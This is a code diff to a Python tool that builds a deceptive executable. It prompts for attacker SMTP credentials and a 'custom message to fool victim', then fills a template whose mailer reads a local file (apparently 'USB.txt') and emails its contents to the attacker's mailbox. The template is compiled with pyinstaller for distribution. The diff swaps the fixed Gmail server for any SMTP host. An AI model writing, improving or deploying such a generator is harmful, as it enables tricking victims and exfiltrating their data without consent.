@@ -1,6 +1,6 @@
 import os
 import platform
-from files.banner import banner , banner2
+from files.banner import banner, banner2
 from getpass import getpass
 from colorama import Fore
 from time import sleep
@@ -19,8 +19,10 @@ G = Fore.GREEN
 def command(str):
     os.system(str)
 
+
 def colors(str):
     return f"\n{W}[{B}</>{W}] {str}"
+
 
 command("cls") if 'Windows' in platform.platform() else command("clear")
 
@@ -28,8 +30,9 @@ banner()
 
 
 def genertor():
-    mail = input(f"\n{C}[{R}-{C}]{Y} Enter Gmail id: " + W)
-
+    mail = input(f"\n{C}[{R}-{C}]{Y} Enter SMTP host: " + W)
+    port = input(f"\n{C}[{R}-{C}]{Y} Enter SMTP port: (25/465/587) " + W)
+    user = input(f"\n{C}[{R}-{C}]{Y} Enter SMTP user:" + W)
     paswd = getpass(f"{Y}[{R}?{Y}] Password: ")
 
     custom_msg = input(f"{Y}[{C}>{Y}] Type custom message to fool victim: " + W)
@@ -39,7 +42,7 @@ def genertor():
     while per != 101:
         string = f"{Y} <{R}/{Y}> {W}Preparing...\t" + C + str(per) + "%"
         sleep(0.1)
-        print(string , end="\r")
+        print(string, end="\r")
 
         per += 1
 
@@ -69,7 +72,7 @@ def mailer(file):
     with open(file , "r") as f:
         read = f.read()
 
-    server = smtplib.SMTP("smtp.gmail.com" , 587)
+    server = smtplib.SMTP("__smtp" , __port)
     server.ehlo()
     server.starttls()
     server.login("__mail" , "__password" )
@@ -91,16 +94,14 @@ os.remove("USB.txt")
 input("\\n--- Done\\n[\\t[+] Press enter to exit")
 """
 
-    script = script.replace("__mail" , mail)
-    script = script.replace("__password" , paswd)
-    script = script.replace("__custom_message" , custom_msg)
-
+    script = script.replace("__mail", user).replace('__smtp', mail).replace('__port' , port)
+    script = script.replace("__password", paswd)
+    script = script.replace("__custom_message", custom_msg)
 
     if os.path.exists("generator.py"):
         os.remove("generator.py")
 
-
-    with open("generator.py" , "a+") as f:
+    with open("generator.py", "a+") as f:
         f.write(script)
 
         print(colors("\nGenerated! \n"))
@@ -109,13 +110,7 @@ input("\\n--- Done\\n[\\t[+] Press enter to exit")
 
     command("pyinstaller generator.py --onefile")
 
-
     input(C + "\n\tPress enter to exit! ")
-    command("xdg-open intro.html")
+
+
 genertor()
-
-
-
-
-
-
